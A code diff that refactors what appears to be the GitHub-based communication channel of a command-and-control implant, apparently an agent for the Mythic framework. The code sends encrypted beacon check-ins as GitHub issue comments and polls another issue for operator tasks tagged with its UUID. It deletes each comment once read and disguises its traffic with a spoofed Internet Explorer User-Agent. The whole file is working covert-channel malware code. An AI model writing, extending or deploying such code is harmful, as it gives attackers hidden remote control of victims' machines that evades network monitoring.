@@ -41,30 +41,16 @@ namespace Agent.Profiles
 
             client.DefaultRequestHeaders.Add("Authorization", $"token {GITHUB_TOKEN}");
             client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");
-            client.DefaultRequestHeaders.Add("User-Agent", "user_agent");
+            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
         }
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            // Post Checkin Message
-            //Console.WriteLine("Start checkin");
-            //Console.WriteLine(agentConfig.uuid);
+            // Post Checkin
+            //Console.WriteLine($"Checkin UUID: {agentConfig.uuid}");
 
-            var json = this.crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
-            string url = $"{URL}/{CLIENT_ISSUE}/comments";
-            var msg = new { body = json };
-            var content = new StringContent(JsonSerializer.Serialize(msg), Encoding.UTF8, "application/json");
-            
-            var response = await client.PostAsync(url, content);
-            if (response.IsSuccessStatusCode)
-            {
-                //Console.WriteLine("Comment successfully created.");
-            }
-            else
-            {
-                //Console.WriteLine($"Failed to create comment. Status code: {response.StatusCode}");
-                //Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
-            }
+            // Send Checkin
+            PostComment(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
             int maxAttempts = 3;
             int currentAttempt = 0;
@@ -74,26 +60,15 @@ namespace Agent.Profiles
                 // to GitHub for the agent to retrieve 
                 await Task.Delay(3000);
 
-                // Get checkin response
-                var comments = await GetComments(SERVER_ISSUE);
-                foreach (var comment in comments)
+                List<string> comments = await GetComments();
+                // there should only be one valid comment returned since it's the checkin response
+                if (comments.Count == 1)
                 {
-                    var message = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
-                    var payloadUuid = message.Substring(0, 36);
-                    var mythMsg = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Substring(36));
-
-                    if (payloadUuid == agentConfig.uuid)
-                    {
-                        if (mythMsg["action"] == "checkin" && payloadUuid != mythMsg["id"])
-                        {
-                            //Console.WriteLine($"Updating new UUID to: {mythMsg["id"]}");
-                            this.cir = JsonSerializer.Deserialize<CheckinResponse>(message.Substring(36));
-                            this.checkedin = true;
-                            await DeleteComment(comment.id);
-                            return this.cir;
-                        }
-                    }
+                    this.checkedin = true;
+                    this.cir = JsonSerializer.Deserialize<CheckinResponse>(comments[0]);
+                    return this.cir;
                 }
+                //Console.WriteLine("Checkin Response not received yet");
                 currentAttempt++;
             } while (currentAttempt <= maxAttempts);
             
@@ -106,9 +81,8 @@ namespace Agent.Profiles
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            //Console.WriteLine(agentConfig.uuid);
+            //Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");
             this.cancellationTokenSource = new CancellationTokenSource();
-            List<(string id, string body)> comments = new List<(string id, string body)>();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
                 //Console.WriteLine("Checking In");
@@ -119,20 +93,13 @@ namespace Agent.Profiles
                 }
 
                 // Check for new tasks
-                comments = await GetComments(SERVER_ISSUE);
+                List<string> comments = await GetComments();
                 if (comments.Count() > 0) {    
                     foreach (var comment in comments) 
                     {
-                        var m = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
-                        var payloadUuid = m.Substring(0, 36);
-                        if (payloadUuid == agentConfig.uuid)
-                        {
-                            //Console.WriteLine("New Task received!");
-                            GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(m.Substring(36));
-                            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
-                            this.SetTaskingReceived(this, tra);
-                            DeleteComment(comment.id);
-                        }
+                        GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(comment);
+                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+                        this.SetTaskingReceived(this, tra);
                     }
                 }
 
@@ -152,24 +119,31 @@ namespace Agent.Profiles
             return true;
         }
 
-        static async Task<List<(string id, string body)>> GetComments(int issueNumber)
+        internal async Task<List<string>> GetComments()
         {
-            var response = await client.GetAsync($"{URL}/{issueNumber}/comments");
+            // Get all comments
+            var response = await client.GetAsync($"{URL}/{SERVER_ISSUE}/comments");
             response.EnsureSuccessStatusCode();
             var jsonResponse = await response.Content.ReadAsStringAsync();
 
             var comments = JsonSerializer.Deserialize<List<Dictionary<string, object>>>(jsonResponse);
-            var result = new List<(string id, string body)>();
-
+            var result = new List<string>();
             foreach (var comment in comments)
             {
-                result.Add((comment["id"].ToString(), comment["body"].ToString()));
+                // check if message is for us
+                var msg = Encoding.UTF8.GetString(Convert.FromBase64String(comment["body"].ToString()));
+                var payloadUuid = msg.Substring(0, 36);
+                if (payloadUuid == agentConfig.uuid)
+                {
+                    result.Add(this.crypt.Decrypt(comment["body"].ToString()));
+                    //delete comment
+                    await client.DeleteAsync($"{URL}/comments/{comment["id"].ToString()}");
+                }
             }
-
             return result;
         }
 
-        private async Task PostComment(string json)
+        internal async Task PostComment(string json)
         {
             //Console.WriteLine(json);
             string msg = this.crypt.Encrypt(json);
@@ -177,12 +151,6 @@ namespace Agent.Profiles
             var payload = new { body = msg };
             var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
             await client.PostAsync(url, content);
-        }
-
-        static async Task DeleteComment(string commentId)
-        {
-            var url = $"{URL}/comments/{commentId}";
-            await client.DeleteAsync(url);
         }
     }
 }
